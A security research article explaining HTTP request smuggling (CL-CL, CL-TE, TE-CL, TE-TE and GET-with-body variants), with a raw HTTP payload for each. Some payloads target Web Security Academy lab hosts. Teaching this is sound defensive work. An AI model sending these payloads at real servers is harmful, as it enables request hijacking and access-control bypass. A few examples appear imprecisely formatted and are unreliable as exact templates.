**Author: mengchen@Knownsec 404 Team**

## 1. Introduction
Recently, I delved into a BlackHat presentation titled "HTTP Desync Attacks: Smashing into the Cell Next Door." The speaker discussed HTTP smuggling attacks and provided several examples. As this was a new concept to me, I decided to conduct a thorough study on the topic, which led to the creation of this article. Please let me know if you notice any errors.

## 2. Timeline
- **2005**: Chaim Linhart, Amit Klein, Ronen Heled, and Steve Orrin published a report on HTTP Request Smuggling. They analyzed the entire RFC document and provided numerous examples to illustrate the potential damage of this attack method.
- **2016 (DEFCON 24)**: @regilero expanded on the previous report in his presentation, "Hiding Wookiees in HTTP," enriching the attack methods.
  - [Hiding-Wookiees-In-Http.pdf](Hiding-Wookiees-In-Http.pdf)
- **2019 (BlackHat USA)**: James Kettle from PortSwigger presented "HTTP Desync Attacks: Smashing into the Cell Next Door." He demonstrated the use of block coding for attacks, expanded the attack surface, and proposed a comprehensive detection and exploitation process.
  - [smashing-into-the-cell-next-door-15153](smashing-into-the-cell-next-door-15153)

## 3. Causes
HTTP request smuggling is a unique and less intuitive form of web attack. In complex network environments, different servers may interpret and implement RFC standards differently, leading to security risks when processing the same HTTP request.

### 3.1 HTTP 1.1 Features: Keep-Alive & Pipeline
Before `HTTP 1.1`, each HTTP request required a new TCP connection, which increased server load. To address this, `HTTP 1.1` introduced two features: `Keep-Alive` and `Pipeline`.

- **Keep-Alive**: This feature allows the client to add a `Connection: Keep-Alive` header to the HTTP request, instructing the server to keep the TCP connection open for subsequent requests to the same server. This reduces the overhead of multiple TCP handshakes and speeds up access. By default, `Keep-Alive` is enabled in `HTTP 1.1`.
- **Pipeline**: With `Keep-Alive`, clients can send multiple HTTP requests without waiting for responses, and the server processes them in a first-in, first-out (FIFO) manner. However, most modern browsers do not enable `Pipeline` by default, although many servers support it.

### 3.2 CDN Acceleration and Reverse Proxies
To enhance user experience and reduce server load, many websites use CDN acceleration services. A common setup involves adding a reverse proxy server with caching capabilities in front of the origin server. When users request static resources, they are served directly from the proxy server, reducing the need to fetch from the origin server.

In such setups, TCP connections between the reverse proxy and the origin server are often reused. This is because the IP addresses of the proxy and origin servers are fixed, making it easier to reuse connections. However, this can also introduce vulnerabilities if the proxy and origin servers handle requests differently.

### 3.3 Examples of HTTP Request Smuggling

#### 3.3.1 GET Request with CL â‰  0
Although `RFC2616` does not explicitly allow GET requests to carry a request body, some implementations might accept it. If the front-end proxy server allows a GET request with a body but the back-end server does not, this can lead to request smuggling.

Example:
```http
GET / HTTP/1.1
Host: example.com
Content-Length: 44
GET /secret HTTP/1.1
Host: example.com
```

- **Front-end Server**: Reads the `Content-Length` and forwards the entire request.
- **Back-end Server**: Ignores the `Content-Length` and treats it as two separate requests, leading to smuggling.

#### 3.3.2 CL-CL (Content-Length Conflict)
If a request contains two `Content-Length` headers with different values, the server should return a 400 error. However, if the intermediate proxy and back-end servers do not enforce this, an attacker can exploit the discrepancy.

Example:
```http
POST / HTTP/1.1
Host: example.com
Content-Length: 8
Content-Length: 7
12345
a
```

- **Intermediate Proxy**: Processes the request based on the first `Content-Length` (8).
- **Back-end Server**: Processes the request based on the second `Content-Length` (7), leaving the extra character `a` in the buffer, which can be appended to the next request, causing an error.

#### 3.3.3 CL-TE (Content-Length vs. Transfer-Encoding)
When a request contains both `Content-Length` and `Transfer-Encoding` headers, the server should ignore `Content-Length`. If the front-end proxy processes `Content-Length` and the back-end server processes `Transfer-Encoding`, this can lead to request smuggling.

Example:
```http
POST / HTTP/1.1
Host: ace01fcf1fd05faf80c21f8b00ea006b.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cookie: session=E9m1pnYfbvtMyEnTYSe5eijPDC04EVm3
Connection: keep-alive
Content-Length: 6
Transfer-Encoding: chunked

0
G
```

- **Front-end Server**: Processes `Content-Length` (6) and considers the request complete.
- **Back-end Server**: Processes `Transfer-Encoding` and leaves the extra character `G` in the buffer, which can be appended to the next request, causing an error.

#### 3.3.4 TE-CL (Transfer-Encoding vs. Content-Length)
If the front-end proxy processes `Transfer-Encoding` and the back-end server processes `Content-Length`, this can also lead to request smuggling.

Example:
```http
POST / HTTP/1.1
Host: acf41f441edb9dc9806dca7b00000035.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cookie: session=3Eyiu83ZSygjzgAfyGPn8VdGbKw5ifew
Content-Length: 4
Transfer-Encoding: chunked

12
GPOST / HTTP/1.1

0
```

- **Front-end Server**: Processes `Transfer-Encoding` and considers the request complete.
- **Back-end Server**: Processes `Content-Length` (4) and considers the following data as a new request, leading to an error.

#### 3.3.5 TE-TE (Transfer-Encoding Conflict)
If both the front-end and back-end servers process `Transfer-Encoding` but interpret it differently, this can also lead to request smuggling.

Example:
```http
POST / HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Transfer-Encoding: identity

12
GPOST / HTTP/1.1

0
```

- **Front-end Server**: Processes the first `Transfer-Encoding` (chunked).
- **Back-end Server**: Processes the second `Transfer-Encoding` (identity), leading to a conflict and potential smuggling.

## Conclusion
HTTP request smuggling is a sophisticated attack that exploits differences in how servers interpret and process HTTP requests. Understanding these vulnerabilities and implementing proper security measures is crucial for protecting web applications.